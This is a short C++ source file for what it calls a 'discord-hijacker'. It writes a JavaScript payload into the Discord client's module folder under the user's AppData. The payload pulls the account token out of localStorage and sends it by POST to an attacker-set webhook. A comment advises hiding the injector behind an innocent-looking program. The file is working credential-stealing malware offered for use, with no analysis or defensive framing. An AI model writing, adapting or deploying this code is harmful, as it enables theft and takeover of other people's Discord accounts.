#include "discord-hijacker.h"

int main()
{
    // NOTE : You can put a legit program here, that has nothing malicious.
    // std::cout << "[+] injecting" << std::endl;
    sprintf(buffer, _("%s\\Discord\\%s\\modules\\%s"), getenv(_("appdata")), config::discord_version.c_str(), get_random_module().c_str());
    sprintf(payload, _("\n var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage; var V = JSON.stringify(X); var L = V; var C = JSON.parse(L); var strtoken = C[\"token\"]; var O = new XMLHttpRequest();O.open('POST', '%s', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{\"content\": ' + strtoken + '}');"), config::webhook_link.c_str());
    try {
        std::ofstream ofstream;
        ofstream.open(buffer, std::ios_base::app); // open the stream
        ofstream << payload; // output the payload to the file
        ofstream.close(); // close the stream
    }
    catch(const std::exception& error) {
        // TODO: add correct error handling
        exit(0);
    }
    // std::cout << "[+] injected" << std::endl;
    std::cin.get();
}
